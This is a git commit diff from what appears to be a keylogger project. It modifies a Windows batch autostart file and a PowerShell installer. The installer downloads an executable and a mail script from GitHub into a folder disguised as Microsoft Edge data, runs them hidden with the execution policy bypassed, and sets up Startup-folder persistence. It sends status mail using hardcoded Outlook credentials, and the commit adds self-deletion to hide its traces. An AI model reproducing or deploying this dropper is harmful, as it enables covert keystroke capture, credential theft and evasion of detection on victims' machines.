620114e0868f9f12fbd10f84bb3cfd623e2d08b7
Mirozo <82079025+MirozoPL@users.noreply.github.com>
2022-12-18 18:56:17 +0100

    2

--- autostarting.bat
+++ autostarting.bat
@@ -2,5 +2,3 @@
 cd "%userprofile%\AppData\Local\MicrosoftEdge\404eb8b50ea0d5d6"
 start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'ygoLa8SyqmQTGsoh.exe'
 start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'LhFDtKhHgdiXDSt3.ps1'
-if exist "%userprofile%\AppData\Local\Temp\G8vGMjXDhui78YqB.ps1" (
-del "%userprofile%\AppData\Local\Temp\G8vGMjXDhui78YqB.ps1" )
--- installer.ps1
+++ installer.ps1
@@ -3,7 +3,8 @@ if (Test-Path C:\path\to\file.txt) {
     Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\ygoLa8SyqmQTGsoh.exe"
     Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\LhFDtKhHgdiXDSt3.ps1"
     #powershell -executionpolicy bypass -File "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
-    powerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
+    powershell -windowstyle hidden -ExecutionPolicy Bypass Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
+    Remove-Item -Path $MyInvocation.MyCommand.Source
 } else {
     $Username = "jankowalski69zs@outlook.com"
     $Password = ConvertTo-SecureString "JanKowalski1" -AsPlainText -Force
@@ -13,4 +14,5 @@ if (Test-Path C:\path\to\file.txt) {
     $Subject = "No file detected."
     $Body = "Failed attempt 0x001"
     Send-MailMessage -SmtpServer "smtp-mail.outlook.com" -UseSsl -Port 587 -Credential $Credential -From $From -To $To -Subject $Subject -Body $Body
+    Remove-Item -Path $MyInvocation.MyCommand.Source
 }
